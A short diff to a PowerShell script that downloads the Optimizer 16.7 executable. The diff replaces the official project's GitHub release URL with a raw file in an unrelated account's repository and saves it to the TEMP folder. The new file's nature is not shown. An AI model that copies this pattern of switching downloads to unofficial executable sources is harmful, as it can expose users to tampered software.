@@ -1,5 +1,5 @@
 # run-optimizer.ps1
-$exeUrl = "https://github.com/hellzerg/optimizer/releases/download/16.7/Optimizer-16.7.exe"
+$exeUrl = "https://github.com/clickinformaticavillaramallo/optimizer/raw/main/Optimizer-16.7.exe"
 $tmpExe = "$env:TEMP\Optimizer-16.7.exe"
 
 Write-Host "[*] Descargando Optimizer 16.7..." -ForegroundColor Yellow
